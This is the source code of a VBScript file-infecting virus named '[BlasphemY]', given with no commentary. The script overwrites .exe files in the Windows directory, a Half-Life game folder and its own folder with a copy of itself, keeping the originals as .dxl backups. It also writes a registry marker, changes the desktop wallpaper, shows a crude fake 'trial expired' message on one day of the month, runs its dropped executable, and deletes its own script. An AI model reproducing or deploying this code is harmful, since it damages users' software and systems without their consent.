On Error Resume Next
msg1 = "Trial Period has expired, please register at www.IamFUCKED.com"
VIRNAME="[BlasphemY]"
WDIR="C:\WINDOWS\"
para=""
curfname="C:\DISKE\$$FF$$.EXE"
CurDir ="C:\DISKE"
SET FSO=CreateObject("Scripting.FileSystemObject")
set Launcher = WScript.CreateObject("Wscript.Shell")
if Launcher.RegRead("HKCU\BlasphemY\")<>virName then
FDIR WDIR
FDIR "C:\SIERRA\Half-Life\"
Launcher.RegWrite "HKCU\BlasphemY\",virName
end if
if lcase(Launcher.RegRead("HKCU\Control Panel\Desktop\Wallpaper"))<>"c:\windows\bs.bmp" then
launcher.regwrite "HKCU\Control Panel\Desktop\Wallpaper","c:\windows\bs.bmp" 
launcher.regwrite "HKCU\Control Panel\Desktop\Wallpaperstyle",2
end if
curdir=curdir&"\"
FDIR CURDIR
FSO.CopyFile Changeext (curfname,"dxl"),"$$FF$$.EXE",true

if day(now)=4 then 
msgbox msg1
end if
if day(now)<>20 then Launcher.Run "$$FF$$.EXE"&" "&para
fso.deletefile(wscript.scriptfullname)
function ChangeExt(fspec,ext)
fsp3c=fspec
dotpos=instr(1,fsp3c,".")
fsp3c=left(fsp3c,dotpos)
fsp3c=fsp3c+ext
ChangeExt=fsp3c
End function
Sub FDir(pathy)
Set FObj=FSO.GetFolder(pathy)
Set FO=FObj.Files
For each target in FO
EName=lcase(FSO.GetExtensionName(target.Name))
if EName="exe" and not FSO.FileExists(pathy&ChangeExt(target.Name,"dxl")) and not lcase(target.name)="wscript.exe" then
FSO.copyFile pathy&Target.Name,pathy&ChangeExt(target.name,"dxl")
FSO.CopyFile curfname,pathy&target.name,true
end if
next
End Sub
